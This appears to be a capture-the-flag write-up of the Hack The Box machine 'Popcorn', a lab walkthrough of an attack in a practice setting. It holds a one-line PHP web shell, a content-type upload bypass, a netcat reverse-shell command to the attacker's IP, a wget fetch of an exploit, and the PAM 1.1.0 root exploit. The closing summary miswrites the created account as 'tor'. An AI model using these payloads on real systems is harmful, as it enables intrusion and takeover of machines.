# Hack The Box - Popcorn

<p align="left">

![Hack The Box](https://img.shields.io/badge/Hack%20The%20Box-POPcorn-9FEF00?style=for-the-badge&logo=hackthebox&logoColor=white)
![OS](https://img.shields.io/badge/OS-Linux-FCC624?style=for-the-badge&logo=linux&logoColor=black)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-F39C12?style=for-the-badge)
![Focus](https://img.shields.io/badge/Focus-Web%20Exploitation-C0392B?style=for-the-badge)

</p>

---

# Machine Information

| Machine | Popcorn |
|----------|---------|
| Operating System | Linux |
| Difficulty | Medium |
| Focus | Web Exploitation |
| Target IP | 10.129.41.39 |
| Attacker IP | 10.10.14.65 |

---

# Overview

Popcorn is a medium-difficulty Linux machine focused primarily on web exploitation.

The initial attack surface is relatively small, with only two exposed services identified during enumeration: OpenSSH and Apache. The default Apache page does not immediately reveal anything useful, so further directory enumeration is required.

Directory brute-forcing discovers a `/torrent` directory containing a torrent hosting application. The application allows users to create accounts without restrictions, making it possible to access functionality that requires authentication.

The main exploitation vector is an insecure file upload mechanism in the torrent application. The upload functionality performs insufficient validation, allowing a PHP file to be uploaded by bypassing both the filename extension check and the HTTP `Content-Type` validation.

Once the uploaded PHP file is accessed, command execution can be achieved through a `cmd` GET parameter, which is then used to obtain a reverse shell.

After obtaining access as the `george` user, local enumeration reveals an unusual file inside the user's cache directory. Further research identifies a privilege escalation vulnerability affecting PAM 1.1.0, which can be exploited to obtain a root shell.

---

# Attack Path

```text
Nmap
  │
  ▼
Apache Web Server
  │
  ▼
Directory Enumeration
  │
  ▼
/torrent
  │
  ▼
Torrent Hoster
  │
  ▼
User Registration
  │
  ▼
Torrent Creation
  │
  ▼
Screenshot Upload
  │
  ▼
PHP Upload Filter Bypass
  │
  ▼
Content-Type Manipulation
  │
  ▼
Remote Command Execution
  │
  ▼
Reverse Shell as george
  │
  ▼
Local Enumeration
  │
  ▼
motd.legal-displayed
  │
  ▼
PAM 1.1.0 Privilege Escalation
  │
  ▼
root
```

---

# Enumeration

## Nmap

The first step is to perform a full TCP port scan against the target.

```bash
nmap -sS -sV -sC -p- -Pn --min-rate 5000 10.129.41.39 -oN nmap
```

<img width="945" height="341" alt="image" src="https://github.com/user-attachments/assets/b58006bb-8ac1-46d1-8101-e2f53bee566b" />



### Results

The scan reveals only two exposed services:

- OpenSSH
- Apache HTTP Server


The limited attack surface makes the web server the most interesting target for further enumeration.

---

# Web Enumeration

Navigate to the web server:

```text
http://10.129.41.39
```

The page displays the default Apache web server page.


Since the default page does not provide any useful information, the next step is to perform directory enumeration.

---

# Directory Enumeration

Use Dirbuster to discover hidden directories and files.

```bash
gobuster
```

Configure the target as:

```text
http://popcorn.htb/
```

<img width="943" height="621" alt="image" src="https://github.com/user-attachments/assets/83a3bd0a-2ca4-4291-9ad2-16333382ff41" />


Among the discovered directories, one particularly interesting path is:

```text
/torrent
```

Access the directory:

```text
http://10.129.41.39/torrent
```

The directory contains a torrent hosting application titled:

```text
Torrent Hoster
```

The application appears to be an open-source torrent hosting template/CMS.

---

# Torrent Hoster Enumeration

Further directory enumeration can be performed against the `/torrent` path to discover additional files and directories.

```bash
gobuster
```

Target:

```text
http://popcorn.htb/torrent/
```

The enumeration reveals several additional resources, including an upload directory that will become important later in the exploitation process.


At this point, the torrent application becomes the primary attack surface.

---

# Application Enumeration

Browsing through the application reveals several potentially interesting functionalities.

The most promising feature is the **Upload** functionality.

However, accessing the upload functionality requires authentication.

### Authentication

The application provides account registration functionality.

Importantly, there are no restrictions preventing arbitrary users from creating accounts.

Create a new account through the registration page.


After successfully registering, authenticate using the newly created account.

```text
Username: hacker 
Password: password
```

Once authenticated, the upload functionality becomes accessible.

---

# Uploading a Torrent File

Before accessing the screenshot upload functionality, the application requires us to provide a valid `.torrent` file.

Since we did not have a torrent file available locally, download any legitimate `.torrent` file from the Internet.

For example, from Kali Linux, download a torrent file and save it locally:

<img width="701" height="363" alt="image" src="https://github.com/user-attachments/assets/8da8da15-3969-45a1-8188-d3bb67780dcd" />


The application allows users to create or modify torrent listings.

After obtaining an existing torrent file or creating a new torrent, the listing can be edited to add additional information.

During the editing process, a **screenshot upload** feature is available.

This functionality is particularly interesting because the server-side validation is insufficient.

The upload mechanism performs two relevant checks:

1. The filename must contain a valid image extension.
2. The HTTP `Content-Type` sent in the POST request must be `image/png`.

These checks can be bypassed.

---

# Identifying the Upload Filter

The first validation checks whether the uploaded filename contains a valid image extension.

A PHP payload can therefore be disguised using an image extension.

Create the following file:

```bash
nano shell.png.php
```

Insert:

```php
<?php echo system($_GET['cmd']); ?>
```

The resulting file is:

```text
shell.png.php
```

The filename contains the expected image extension while still ending in `.php`.

The second validation is performed against the HTTP `Content-Type` header.

The server expects:

```http
Content-Type: image/png
```

Therefore, the request must be intercepted and modified before reaching the server.

---

# Burp Suite Request Modification

Configure Burp Suite as the HTTP proxy and upload the PHP payload through the application's screenshot upload functionality.

Intercept the request.

The original request contains a PHP content type similar to:

```http
Content-Type: application/php
```

Modify it to:

```http
Content-Type: image/png
```

The relevant HTTP request header is:

```http
Content-Type: image/png
```

This bypasses the second upload validation.


The uploaded file is now accepted by the application.

---

# Upload Directory

Return to the directory enumeration results.

An upload directory was previously discovered:

```text
/torrent/upload
```

Navigate to:

```text
http://popcorn.htb/torrent/upload/
```

The directory contains the uploaded files.

The PHP file is present, although the application renames the uploaded file.

<img width="956" height="480" alt="image" src="https://github.com/user-attachments/assets/92694541-7386-4682-9286-5961fa82e1c5" />


The uploaded PHP file can now be accessed through the browser.

This provides a way to execute arbitrary commands on the target through the `cmd` GET parameter.

---

# Remote Command Execution

Before obtaining a reverse shell, start a Netcat listener on the attacker machine.

```bash
nc -nvlp 4444
```

Attacker IP:

```text
10.10.14.65
```

The uploaded PHP file executes commands through:

```text
?cmd=nc -e /bin/sh 10.10.14.65 4444
```

A reverse shell can therefore be triggered by requesting the uploaded PHP file with a Netcat command.

The general payload is:

```text
http://popcorn.htb/torrent/upload/83f92aecfa3d92d3df79a5661ad8efb57282b48b.php?cmd=nc -e /bin/sh 10.10.14.65 4444
```

<img width="960" height="209" alt="image" src="https://github.com/user-attachments/assets/a082d901-cedc-46db-bab6-49909cf14f6a" />


Once the request is executed, the Netcat listener receives a connection from the target.

We now have command execution on the machine and an initial shell as the `george` user.

---

# User Flag

Verify the current user:

```bash
whoami
```

Expected result:

```text
george
```

The user flag is located at:

```text
/home/george/user.txt
```

Read it with:

```bash
cat /home/george/user.txt
```
# Improving the Shell

The reverse shell obtained through Netcat is non-interactive.

A semi-interactive shell is required for the privilege escalation technique used later.

Check whether Python is available:

```bash
which python
```

If Python is installed, spawn a new shell through a pseudo-terminal:

```bash
python -c 'import pty; pty.spawn("/bin/sh")'
```

The shell is now semi-interactive.

<img width="958" height="80" alt="image" src="https://github.com/user-attachments/assets/37894246-0cba-4498-a6d8-79e1a56c15a7" />


---

# Local Enumeration

Now that we have shell access as `george`, begin enumerating the filesystem for interesting files.

The home directory is:

```text
/home/george
```

List its contents recursively:

```bash
ls -lAR /home/george
```

<img width="952" height="345" alt="image" src="https://github.com/user-attachments/assets/4756b429-dfbb-4aa1-9f41-57e3072b1ffc" />


Among the files discovered during enumeration, an unusual file is located inside the user's cache directory:

```text
/home/george/.cache/motd.legal-displayed
```

This file is particularly interesting because it is not a typical file expected in the user's home directory.

---

# Privilege Escalation Enumeration

Inspect the suspicious file:

```bash
ls -l /home/george/.cache/motd.legal-displayed
```

The presence of this file leads to further investigation into the version of PAM installed on the system.

The machine is running:

```text
PAM 1.1.0
```

Research into this version reveals a privilege escalation vulnerability involving file tampering.

The relevant exploit is:

```text
Exploit-DB 14339
```

This vulnerability can be leveraged to modify files used by the system and execute commands with elevated privileges.

---

# PAM 1.1.0 Privilege Escalation

The exploit requires executing the privilege escalation script directly on the target.

Since we already have a semi-interactive shell, the environment is suitable for running the exploit.

Transfer the exploit to the target machine.

From the attacker machine, host the exploit with a simple HTTP server:


```bash
python3 -m http.server 8000
```
First we have be in /tmp. Then, from the target, download the exploit:

```bash
wget http://10.10.14.65:8000/14339.sh -O exploit.sh
```

Make the exploit executable:

```bash
chmod +x exploit.sh
```
<img width="955" height="368" alt="image" src="https://github.com/user-attachments/assets/8a8ed44a-a964-44d9-a86f-c3755036a121" />


---

# Executing the Exploit

Run the privilege escalation exploit:

```bash
./exploit.sh
```

The exploit abuses the vulnerable PAM functionality to tamper with files involved in the system's message-of-the-day mechanism.


<img width="954" height="266" alt="image" src="https://github.com/user-attachments/assets/893f7f92-9845-4589-b303-841f49b712b1" />


The exploit creates a new local account with privileges equivalent to the `root` account.

It does not immediately change the current shell to `root`.

To identify the newly created account, inspect `/etc/passwd`.

```bash
cat /etc/passwd
```
<img width="957" height="549" alt="image" src="https://github.com/user-attachments/assets/75eeced3-dd63-4923-a6f6-3cfe16034310" />


At the bottom of the file, a new user can be found:

```text
toor
```

The account is associated with UID `0`, meaning that it has the same effective privileges as `root`.

The important entry follows the structure:

```text
toor:x:0:0:...
```

The `0:0` values indicate that the account has UID 0 and belongs to the root group.

---

# Switching to the Privileged User

The newly created account uses the default credentials:

```text
Username: toor
Password: toor
```

Switch to the new account:

```bash
su toor
```

Enter the password:

```text
toor
```

<img width="960" height="269" alt="image" src="https://github.com/user-attachments/assets/ed9fd394-d3f1-4275-97ae-68308802c72f" />


Verify the current user:

```bash
whoami
```

Expected output:

```text
root
```

However, the username alone does not indicate the effective privilege level.

Verify the UID:

```bash
id
```

The output shows:

```text
uid=0(root) gid=0(root) groups=0(root)
```

Since UID `0` corresponds to the root privilege level, the `toor` account effectively has full administrative privileges.

---

# Root Access

Although the current username is:

```text
toor
```

the account has UID `0`.

Therefore, it has the same system privileges as the `root` account.

Confirm access to the root directory:

```bash
ls -la /root
```

The directory is accessible because the current account has root-level privileges.

At this point, full control of the machine has been obtained.

---

# Root Flag

Read the root flag:

```bash
cat /root/root.txt
```

<img width="958" height="123" alt="image" src="https://github.com/user-attachments/assets/28355a17-9d2f-4ae7-84d9-634278a1d536" />


The machine has now been fully compromised.

---

# Final Attack Path

```text
Nmap
  │
  ▼
Apache
  │
  ▼
Dirbuster
  │
  ▼
/torrent
  │
  ▼
Torrent Hoster
  │
  ▼
Create Account
  │
  ▼
Upload .torrent
  │
  ▼
Edit Torrent
  │
  ▼
Screenshot Upload
  │
  ▼
PHP Payload
  │
  ▼
Content-Type Bypass
  │
  ▼
Remote Command Execution
  │
  ▼
Reverse Shell
  │
  ▼
george
  │
  ▼
PAM 1.1.0
  │
  ▼
Exploit-DB 14339
  │
  ▼
Create UID 0 User
  │
  ▼
tor:tor
  │
  ▼
su tor
  │
  ▼
UID 0
  │
  ▼
root privileges
```

---

# Flags

## User Flag

```text
/home/george/user.txt
```

```bash
cat /home/george/user.txt
```

## Root Flag

```text
/root/root.txt
```

```bash
cat /root/root.txt
```

# Key Takeaways

- Perform complete web directory enumeration even when the main page only displays a default Apache page.
- Test registration functionality when an application requires authentication.
- Understand the complete workflow of an application's upload functionality instead of focusing only on the final file upload.
- File upload restrictions can sometimes be bypassed through filename manipulation.
- HTTP request headers such as `Content-Type` may also be used by applications as upload validation mechanisms.
- Intercepting requests with Burp Suite allows client-side submitted values to be modified before reaching the server.
- Always enumerate the filesystem after obtaining a shell.
- Unusual files inside user directories can provide important clues for privilege escalation.
- Keep the shell environment in mind when exploiting Linux vulnerabilities; some exploits require an interactive or semi-interactive terminal.
- PAM and other authentication-related components should be checked during Linux privilege escalation enumeration when their versions are known to be vulnerable.
